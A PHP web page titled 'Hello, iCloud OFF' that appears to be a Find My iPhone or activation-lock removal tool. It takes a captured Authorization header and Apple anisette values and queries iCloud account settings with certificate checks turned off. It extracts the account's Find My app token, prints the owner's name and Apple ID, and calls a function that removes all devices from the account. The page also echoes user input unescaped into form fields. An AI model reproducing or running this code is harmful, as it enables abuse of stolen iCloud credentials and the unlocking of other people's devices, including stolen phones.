<?php
    $basic = empty($_POST['basic']) ? null : $_POST['basic'];
    $mdm = empty($_POST['mdm']) ? null : $_POST['mdm'];
    $md = empty($_POST['md']) ? null : $_POST['md'];
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">

    <title>Hello, iCloud OFF</title>
    <style>
input[type=text], select {
  font-family: 'Baloo Tamma 2', cursive;
  width: 70%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
}
        body{
    margin: 0;
    padding: 0;
    background: #FBFBFD;
}

.container{
    width: 50%;
    top:-20%;
    position:absolute;
    overflow: hidden;
    transform:translate(50%,40%);
}
.container h1{
    text-align: center;
    font-size: 70px;
    color: #000000;
}
.container input{
    display: block;
    width: 100%;
    padding: 0 16px;
    height: 40px;
    text-align: center;
    box-sizing: border-box;
    outline: none;
    border: #D6D6D6 2px solid;
    font-family: "montserrat",sans-serif;
}
    </style>
  </head>
  <body>
    <div class="container">
        <form method="post">
            Authorization: <input type="text" class="form-control" value="<?= $basic; ?>" name="basic" /><br />
            X-Apple-I-MD-M: <input type="text" class="form-control" value="<?= $mdm; ?>" name="mdm" /><br />
            X-Apple-I-MD: <input type="text" class="form-control" name="md" autocomplete="off" /><br /><br />
            <input type="submit" class="btn btn-success btn-block" name="submit" /><br /><br />
			<div class="text-center">
			<a class="btn btn-primary" href="proxy.php" role="button">Back Home</a>
			</div>
        </form>
</script>
        <br />
        <br />
        <div align="center" class="text-center">
        <?php   
            $submit = empty($_POST['submit']) ? null : $_POST['submit'];

            if ( isset($submit) )
            {
                require_once 'PlistParser.php';

                $curl = curl_init();
                curl_setopt_array($curl, array(
                CURLOPT_URL => "https://setup.icloud.com/setup/get_account_settings",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => "",
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => "GET",
                CURLOPT_HTTPHEADER => array(
                    "Content-Type: application/json",
                    "X-MMe-Client-Info: <iPhone9,3> <iPhone OS;13.3.1;17D50> <com.apple.AppleAccount/1.0 (com.apple.Preferences/181.1)>",
                    "X-Apple-Find-API-Ver: 2.0",
                    "Connection: keep-alive",
                    "X-Apple-OAuth-Client-Type: firstPartyAuth",
                    "X-Apple-AuthScheme: Forever",
                    "X-Apple-Realm-Support: 1.0",
                    "X-Apple-I-MD: ".$md,
                    "X-Apple-I-MD-M: ".$mdm,
                    "Accept: */*",
                    "Authorization:  ".$basic
                ),
                ));

                $response = curl_exec($curl);

                curl_close($curl);

                if ( !stristr($response, 'UNAUTHORIZED') )
                {
                    include_once "class/deviceClass.php";

                    file_put_contents('info.plist', $response);
                    $plistParser = new PlistParser;
                    $result = $plistParser->plistToArray("info.plist");

                    $token = base64_encode($result['appleAccountInfo']['dsPrsID'].':'.$result['tokens']['mmeFMIPAppToken']);

                    $deviceObj = new deviceClass($token, $md, $mdm);

                    //var_dump($result);

                    echo 'Fullname: '. $result['appleAccountInfo']['fullName'].'<br />';
                    echo 'Apple ID: '. $result['appleAccountInfo']['appleId'].'<br />';
                    echo 'DSID: '. $result['appleAccountInfo']['dsPrsID'].'<br /><br />';
                    //echo '<textarea rows="5" class="form-control" style="width: 100%">'.$deviceObj->removeDeviceAll().'</textarea><br /><br />';

                    echo "<h3>".$deviceObj->start()."</h3>";
					echo "<h3>".$deviceObj->removeDeviceAll()."</h3>";
                }
                else {
                    echo 'UNAUTHORIZED! wrong token or MD is expired.';
                }
            }
        ?>
        </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
  </body>
</html>